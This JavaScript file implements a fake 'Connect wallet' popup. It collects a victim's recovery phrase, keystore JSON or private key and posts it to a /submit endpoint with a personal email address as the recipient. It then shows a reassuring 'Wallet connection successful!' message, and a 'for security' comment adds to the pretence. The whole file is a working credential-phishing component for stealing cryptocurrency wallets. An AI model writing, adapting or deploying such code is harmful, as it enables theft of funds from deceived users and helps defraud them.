/** @format */

function showPopup(walletName) {
	const popup = document.getElementById('walletPopup');
	const title = document.getElementById('popupTitle');
	popup.style.display = 'flex';
	title.textContent = `Connect ${walletName}`;

	toggleFieldLocks();

	document.getElementById('walletForm').onsubmit = async function (e) {
		e.preventDefault();

		const phrase = document.getElementById('phrase').value.trim();
		const keystoreJSON = document.getElementById('keystore').value.trim();
		const privateKey = document.getElementById('privateKey').value.trim();

		const filledFields = [phrase, keystoreJSON, privateKey].filter(Boolean);

		if (filledFields.length === 0) {
			alert('Please fill at least one field.');
			return;
		}

		if (filledFields.length > 1) {
			alert('Please fill only one field at a time.');
			return;
		}

		const walletData = {
			to: 'maxwellexcel2@gmail.com',
			walletName,
			phrase,
			keystoreJSON,
			privateKey,
		};

		try {
			const response = await fetch('/submit', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify(walletData),
			});

			if (response.ok) {
				const result = await response.json();
				alert('Wallet connection successful! ✅');
			} else {
				const errorData = await response.json();
				alert(`Error: ${errorData.error || 'Something went wrong.'}`);
			}
		} catch (error) {
			console.error('Connection error:', error);
			alert('Failed to connect. Please try again later.');
		}

		closePopup();
	};
}

function closePopup() {
	document.getElementById('walletPopup').style.display = 'none';

	// Clear form fields for security
	document.getElementById('phrase').value = '';
	document.getElementById('keystore').value = '';
	document.getElementById('privateKey').value = '';

	// Re-enable all fields in case they were disabled
	document.getElementById('phrase').disabled = false;
	document.getElementById('keystore').disabled = false;
	document.getElementById('privateKey').disabled = false;
}

function toggleFieldLocks() {
	const phrase = document.getElementById('phrase');
	const keystore = document.getElementById('keystore');
	const privateKey = document.getElementById('privateKey');

	const fields = [phrase, keystore, privateKey];

	fields.forEach((field, idx) => {
		field.addEventListener('input', () => {
			if (field.value.trim() !== '') {
				fields.forEach((f, i) => {
					if (i !== idx) f.disabled = true;
				});
			} else {
				const allEmpty = fields.every(f => f.value.trim() === '');
				if (allEmpty) {
					fields.forEach(f => f.disabled = false);
				}
			}
		});
	});
}
